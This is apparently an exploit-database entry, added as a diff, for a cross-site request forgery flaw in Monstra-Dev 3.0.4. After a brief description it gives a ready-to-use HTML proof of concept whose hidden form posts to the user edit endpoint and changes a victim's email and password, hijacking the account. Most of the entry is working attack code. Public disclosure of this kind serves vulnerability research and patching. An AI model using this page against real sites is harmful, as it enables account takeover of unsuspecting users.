@@ -1,0 +1,41 @@
+# Exploit Title: Monstra-Dev 3.0.4 - Cross-Site Request Forgery(Account Hijacking)
+# Date: 2018-08-04
+# Exploit Author: Nainsi Gupta
+# Vendor Homepage: http://monstra.org/
+# Product Name: Monstra-dev
+# Version: 3.0.4
+# Tested on: Windows 10 (Firefox/Chrome)
+# CVE : N/A
+
+# 1. Description
+# CSRF vulnerability in admin/user/edit in Monstra-dev 3.0.4 allows an attacker
+# to take over a user account by modifying user's data such as email and password
+ 
+# 2. Exploit and Proof of Concept
+# To exploit this vulnerability, victim need to be logged in at target site namely
+# victim.com and visit crafted site made by attacker namely attacker.com. 
+# Then an authenticated POST request will be generated from victim browser and it will
+# be submit to victim.com to modify user's data to attacker desired value.
+
+#POC:CSRF
+
+<html>
+  <!-- CSRF PoC -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/monstra-dev/users/2/edit" method="POST">
+      <input type="hidden" name="csrf" value="7e172c2a395495f3e4c05912cb9f3f7f0ed8344e" />
+      <input type="hidden" name="user&#95;id" value="2" />
+      <input type="hidden" name="login" value="guptanainisi95" />
+      <input type="hidden" name="firstname" value="sd" />
+      <input type="hidden" name="lastname" value="jkh" />
+      <input type="hidden" name="email" value="guptanainsi97&#64;gmail&#46;com" />
+      <input type="hidden" name="twitter" value="" />
+      <input type="hidden" name="skype" value="" />
+      <input type="hidden" name="about&#95;me" value="ss" />
+      <input type="hidden" name="new&#95;password" value="qaz" />
+      <input type="hidden" name="edit&#95;profile" value="Save" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
